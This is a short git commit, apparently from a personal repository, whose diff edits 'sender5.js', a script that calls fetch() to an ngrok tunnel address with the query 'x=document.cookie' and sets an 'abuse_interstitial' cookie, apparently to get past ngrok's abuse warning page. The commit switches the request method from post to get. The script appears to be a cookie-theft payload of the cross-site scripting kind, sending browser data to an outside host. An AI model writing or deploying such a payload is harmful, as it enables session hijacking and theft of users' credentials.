f74b15bc6f417dfd4e8d3f3cb1c81f70fd05a12e
merteren1234 <118080184+merteren1234@users.noreply.github.com>
2025-02-16 21:47:18 +0300

    Update sender5.js

--- sender5.js
+++ sender5.js
@@ -1,5 +1,5 @@
 fetch("https://5e65-24-133-64-217.ngrok-free.app/?x=document.cookie", {
-      method: "post",
+      method: "get",
       headers: {
         'Cookie':'abuse_interstitial=5e65-24-133-64-217.ngrok-free.app',
       },
